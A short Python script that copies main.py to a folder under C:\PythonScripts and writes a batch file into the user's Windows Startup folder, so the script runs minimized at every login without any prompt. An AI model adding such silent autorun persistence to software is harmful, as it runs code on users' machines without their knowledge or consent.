#
# Console Application, can be seen
#
import getpass
import os
import shutil
USER_NAME = getpass.getuser()
file_path = "./main.py"


newpath = r'C:\PythonScripts\SimpleExtension'
if not os.path.exists(newpath):
  os.makedirs(newpath)

original = file_path
target = newpath + '/main.py'

shutil.copyfile(original, target)

bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
    bat_file.write(r'start /min %s ^& exit' % target)